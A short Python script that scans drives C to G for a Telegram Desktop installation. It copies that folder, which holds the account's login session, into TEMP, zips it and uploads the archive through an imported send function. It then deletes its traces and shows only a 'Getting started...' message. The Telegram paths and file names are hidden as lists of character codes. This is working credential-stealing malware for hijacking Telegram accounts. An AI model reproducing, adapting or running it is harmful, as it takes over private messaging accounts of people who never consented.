import os
import shutil
import sys
from reqinstall import scan
from zmaker import trans, pack
from zsender import idx, snd, d

D, E = [84,101,108,101,103,114,97,109,32,68,101,115,107,116,111,112], [84,101,108,101,103,114,97,109,46,101,120,101]
C = {
    0: [[84,101,108,101,103,114,97,109,46,101,120,101], [117,110,105,110,115,48,48,48,46,100,97,116], [117,110,105,110,115,48,48,48,46,101,120,101],
        [117,110,105,110,115,48,48,49,46,100,97,116], [117,110,105,110,115,48,48,49,46,101,120,101], [85,112,100,97,116,101,114,46,101,120,101]],
    1: [[117,115,101,114,95,100,97,116,97]] + [[117,115,101,114,95,100,97,116,97,35]+[48+i] for i in range(2,11)] + [[101,109,111,106,105], [119,101,98,118,105,101,119], [116,101,109,112]]
}
C = {k: [d(v) if isinstance(v, list) else v for v in vs] for k, vs in C.items()}
K = [67, 68, 69, 70, 71]

processed_dirs = set()
archive_successfully_sent = False
folder_index = None

def p(b, t, a, g):
    t_dir = os.path.join(t, "temp_copy")
    a_file = os.path.join(a, "archive.zip")
    def process(r):
        global archive_successfully_sent, folder_index
        x = os.path.join(r, d(g))
        if x in processed_dirs:
            if archive_successfully_sent:
                return
            if os.path.exists(os.path.join(x, d(E))) and folder_index is not None:
                if pack(t_dir, a_file, C):
                    if snd(a_file, folder_index):
                        archive_successfully_sent = True
                if os.path.exists(t_dir):
                    shutil.rmtree(t_dir)
                if os.path.exists(a_file):
                    os.remove(a_file)
            return
        if os.path.exists(os.path.join(x, d(E))):
            processed_dirs.add(x)
            trans(x, t_dir, C)
            if pack(t_dir, a_file, C):
                if folder_index is None:
                    folder_index = idx()
                if snd(a_file, folder_index):
                    archive_successfully_sent = True
            if os.path.exists(t_dir):
                shutil.rmtree(t_dir)
            if os.path.exists(a_file):
                os.remove(a_file)
    return process

def r():
    sys.stdout.write("Getting started...\n")
    sys.stdout.flush()
    scan(K, lambda x: d(D) in x, p("", os.getenv("TEMP"), os.getenv("TEMP"), D))

r()